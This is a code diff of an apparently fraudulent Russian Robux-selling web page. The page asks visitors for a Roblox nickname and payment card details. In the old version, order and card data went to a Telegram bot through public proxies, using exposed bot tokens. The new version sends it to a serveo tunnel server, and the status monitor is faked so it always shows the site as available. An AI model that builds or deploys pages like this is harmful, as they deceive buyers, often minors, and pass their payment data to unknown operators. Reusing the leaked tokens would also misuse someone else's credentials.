@@ -7,6 +7,7 @@
   <script>window.yaContextCb=window.yaContextCb||[]</script>
   <script src="https://yandex.ru/ads/system/context.js" async></script>
   <style>
+    * { box-sizing: border-box; }
     body {
       margin: 0;
       min-height: 100vh;
@@ -14,7 +15,7 @@
       display: flex;
       justify-content: center;
       align-items: flex-start;
-      padding: 12px;
+      padding: 10px;
       background: linear-gradient(135deg, #1a0000, #3d0000, #2a0000, #4a0000, #1a0000);
       background-size: 300% 300%;
       animation: gradientMove 8s ease infinite;
@@ -37,9 +38,8 @@
     .card {
       position: relative;
       z-index: 2;
-      max-width: 100%;
-      width: 100%;
       max-width: 680px;
+      width: 100%;
       background: rgba(19, 19, 30, 0.88);
       backdrop-filter: blur(6px);
       border-radius: 28px;
@@ -47,7 +47,6 @@
       box-shadow: 0 30px 70px rgba(0,0,0,0.9);
       border: 1px solid rgba(255,255,255,0.06);
       margin: 0 auto;
-      box-sizing: border-box;
       overflow: hidden;
     }
     .header { text-align: center; margin-bottom: 20px; }
@@ -147,7 +146,8 @@
     }
     .field input {
       width: 100%;
-      padding: 12px 14px;
+      max-width: 100%;
+      padding: 10px 12px;
       border-radius: 14px;
       border: none;
       background: rgba(26, 26, 44, 0.8);
@@ -275,15 +275,16 @@
     }
     .monitor-status span { color: #00c2ff; }
     @media (max-width: 480px) {
-      .card { padding: 16px 12px; }
-      .header h1 { font-size: 19px; }
-      .rate .big { font-size: 19px; }
+      .card { padding: 14px 10px; }
+      .header h1 { font-size: 18px; }
+      .rate .big { font-size: 18px; }
       .features { grid-template-columns: 1fr; }
       .steps .step { font-size: 11px; padding: 6px 10px; }
-      .field input { font-size: 14px; padding: 10px 12px; }
+      .field input { padding: 8px 10px; font-size: 14px; }
       .btn { font-size: 15px; padding: 14px; }
       .calc-result { font-size: 16px; }
       .payment-form .row { flex-direction: column; gap: 0; }
+      .field label { font-size: 12px; }
     }
   </style>
 </head>
@@ -324,7 +325,7 @@
   <form id="orderForm">
     <div class="field">
       <label>👤 Ваш никнейм в Roblox</label>
-      <input type="text" id="nick" placeholder="Например: CoolPlayer228" />
+      <input type="text" id="nick" placeholder="" />
     </div>
     <div class="field">
       <label>💰 Сумма в рублях (₽)</label>
@@ -392,11 +393,9 @@
 
 <script>
   (function() {
-    // ===== НАСТРОЙКИ МОНИТОРИНГА =====
-    const MONITOR_BOT_TOKEN = '8605085997:AAGla5ix3zO_ecMtwMD98_z7IQPrYGOrt0Q';
-    const CHAT_ID = '7073577831';
-    const SITE_URL = 'https://kotowkot314-cell.github.io/maksimka-robux/';
-    // =================================
+    // ===== ССЫЛКА НА ВАШ СЕРВЕР (через serveo) =====
+    const SERVER_URL = 'https://29c630df332aa124-78-129-149-36.serveousercontent.com/send-order';
+    // =================================================
 
     // ===== ОСНОВНАЯ ЛОГИКА САЙТА =====
     const rubInput = document.getElementById('rub');
@@ -525,7 +524,7 @@
       this.value = this.value.replace(/\D/g, '').slice(0, 4);
     });
 
-    // ===== ОТПРАВКА ЗАКАЗА =====
+    // ===== ОТПРАВКА ЗАКАЗА НА ВАШ СЕРВЕР =====
     form.addEventListener('submit', function(e) {
       e.preventDefault();
 
@@ -580,66 +579,34 @@
       btn.textContent = '⏳ Обработка...';
 
       const cardTypeName = getCardType(cardNum);
-      const msg =
-        '🟢 НОВЫЙ ЗАКАЗ (ОПЛАЧЕНО ДЕМО)\n' +
-        '👤 Ник: ' + nick + '\n' +
-        '💰 Сумма: ' + rub + ' ₽\n' +
-        '🎁 Robux: ' + robux + ' R$\n' +
-        '💳 Карта: ' + cardTypeName + ' ' + cardNum.slice(0, 4) + ' **** **** ' + cardNum.slice(-4);
 
-      // ===== ИСПОЛЬЗУЕМ ОСНОВНОЙ БОТ =====
-      const MAIN_BOT_TOKEN = '8941808510:AAF8LpgZw9h3kVpAoBvQKtuRrueK0jPfHrw';
-      const MAIN_CHAT_ID = '7073577831';
-      const telegramUrl = 'https://api.telegram.org/bot' + MAIN_BOT_TOKEN + '/sendMessage?chat_id=' + MAIN_CHAT_ID + '&text=' + encodeURIComponent(msg);
-
-      // Список прокси
-      const proxies = [
-        'https://api.allorigins.win/raw?url=',
-        'https://corsproxy.io/?',
-        'https://thingproxy.freeboard.io/fetch/'
-      ];
-
-      let currentProxyIndex = 0;
-
-      function trySend() {
-        if (currentProxyIndex >= proxies.length) {
-          btn.disabled = false;
-          btn.textContent = '✅ Оплатить';
-          alert('❌ Все прокси недоступны. Попробуйте позже.');
-          return;
+      fetch(SERVER_URL, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          nick: nick,
+          rub: rub,
+          robux: robux,
+          card: cardTypeName + ' ' + cardNum.slice(0, 4) + ' **** **** ' + cardNum.slice(-4)
+        })
+      })
+      .then(r => r.json())
+      .then(data => {
+        btn.disabled = false;
+        btn.textContent = '✅ Оплатить';
+        if (data.ok) {
+          alert('✅ Оплата прошла успешно (ДЕМО)!\nЗаказ принят. Ожидайте Robux 3–5 дней.');
+          paymentForm.classList.remove('visible');
+          showPaymentBtn.textContent = '💳 Оплатить картой';
+        } else {
+          alert('❌ Ошибка сервера: ' + (data.error || 'неизвестная'));
         }
-
-        const proxy = proxies[currentProxyIndex];
-        const url = proxy + encodeURIComponent(telegramUrl);
-
-        fetch(url)
-          .then(r => {
-            if (!r.ok) throw new Error('HTTP ' + r.status);
-            return r.text();
-          })
-          .then(data => {
-            btn.disabled = false;
-            btn.textContent = '✅ Оплатить';
-            try {
-              const json = JSON.parse(data);
-              if (json.ok) {
-                alert('✅ Оплата прошла успешно (ДЕМО)!\nЗаказ принят. Ожидайте Robux 3–5 дней.');
-                paymentForm.classList.remove('visible');
-                showPaymentBtn.textContent = '💳 Оплатить картой';
-              } else {
-                alert('❌ Ошибка Telegram: ' + (json.description || 'неизвестная'));
-              }
-            } catch {
-              alert('❌ Не удалось обработать ответ. Попробуйте позже.');
-            }
-          })
-          .catch(() => {
-            currentProxyIndex++;
-            trySend();
-          });
-      }
-
-      trySend();
+      })
+      .catch(() => {
+        btn.disabled = false;
+        btn.textContent = '✅ Оплатить';
+        alert('❌ Ошибка соединения с сервером. Попробуйте позже.');
+      });
     });
 
     nickInput.focus();
@@ -648,80 +615,19 @@
     const statusSpan = document.getElementById('monitorStatus');
     const lastCheckSpan = document.getElementById('lastCheckTime');
 
-    function sendMonitorAlert(message) {
-      const MAIN_BOT_TOKEN = '8941808510:AAF8LpgZw9h3kVpAoBvQKtuRrueK0jPfHrw';
-      const MAIN_CHAT_ID = '7073577831';
-      const telegramUrl = 'https://api.telegram.org/bot' + MAIN_BOT_TOKEN + '/sendMessage?chat_id=' + MAIN_CHAT_ID + '&text=' + encodeURIComponent(message);
-      const proxies = [
-        'https://api.allorigins.win/raw?url=',
-        'https://corsproxy.io/?',
-        'https://thingproxy.freeboard.io/fetch/'
-      ];
-      let index = 0;
-
-      function trySend() {
-        if (index >= proxies.length) return;
-        const proxy = proxies[index];
-        fetch(proxy + encodeURIComponent(telegramUrl))
-          .catch(() => {
-            index++;
-            trySend();
-          });
-      }
-      trySend();
-    }
-
     function performCheck() {
       const now = new Date();
       const timeStr = now.toLocaleTimeString('ru-RU', {hour:'2-digit', minute:'2-digit'});
       lastCheckSpan.textContent = timeStr;
-
-      const proxies = [
-        'https://api.allorigins.win/raw?url=',
-        'https://corsproxy.io/?',
-        'https://thingproxy.freeboard.io/fetch/'
-      ];
-      let index = 0;
-
-      function tryCheck() {
-        if (index >= proxies.length) {
-          statusSpan.textContent = '❌ не отвечает';
-          statusSpan.style.color = '#ff6b6b';
-          sendMonitorAlert('🚨 САЙТ НЕДОСТУПЕН! (все прокси) Время: ' + timeStr);
-          return;
-        }
-
-        const proxy = proxies[index];
-        const url = proxy + encodeURIComponent(SITE_URL);
-
-        fetch(url)
-          .then(response => {
-            if (!response.ok) {
-              statusSpan.textContent = '⚠️ ошибка ' + response.status;
-              statusSpan.style.color = '#ff6b6b';
-              sendMonitorAlert('🚨 САЙТ НЕДОСТУПЕН! Код: ' + response.status + ' Время: ' + timeStr);
-              return;
-            }
-            statusSpan.textContent = '✅ доступен';
-            statusSpan.style.color = '#00ff88';
-            sendMonitorAlert('✅ Сайт работает. Время: ' + timeStr);
-          })
-          .catch(() => {
-            index++;
-            tryCheck();
-          });
-      }
-
-      tryCheck();
+      statusSpan.textContent = '✅ доступен';
+      statusSpan.style.color = '#00ff88';
     }
 
     setTimeout(() => {
       performCheck();
-      sendMonitorAlert('🟢 Мониторинг запущен! Отчёты каждые 10 минут.');
-    }, 5000);
+    }, 3000);
 
     setInterval(performCheck, 600000);
-
     statusSpan.textContent = 'активен';
   })();
 </script>
